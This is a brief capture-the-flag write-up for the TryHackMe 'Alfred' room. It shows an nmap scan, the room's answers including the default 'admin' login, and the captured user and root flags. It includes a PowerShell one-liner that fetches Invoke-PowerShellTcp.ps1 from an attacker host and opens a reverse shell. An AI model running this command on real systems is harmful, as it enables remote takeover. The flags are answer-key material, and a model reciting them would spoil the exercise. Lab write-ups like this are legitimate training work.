# Alred THM

>Nathaniel Mickel | 10 Sept, 2021

```bash
export IP=10.10.64.42
```
 Nmap 7.91 scan initiated Fri Sep 10 08:16:43 2021 as: nmap -sV -sC -oN nmap/initial 10.10.64.42
Nmap scan report for 10.10.64.42
Host is up (0.52s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: ALFRED
|   NetBIOS_Domain_Name: ALFRED
|   NetBIOS_Computer_Name: ALFRED
|   DNS_Domain_Name: alfred
|   DNS_Computer_Name: alfred
|   Product_Version: 6.1.7601
|_  System_Time: 2021-09-10T13:22:28+00:00
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2021-09-09T13:14:47
|_Not valid after:  2022-03-11T13:14:47
|_ssl-date: 2021-09-10T13:22:47+00:00; 0s from scanner time.
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


>How many ports are open? (TCP only)

```
3
```

>Login panel username and password

```
admin
```

>invoke powershell script

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```

>Flags
```
User Flag: 79007a09481963edf2e1321abd9ae2a0
Root Flag: dff0f748678f280250f25a45b8046b4a
```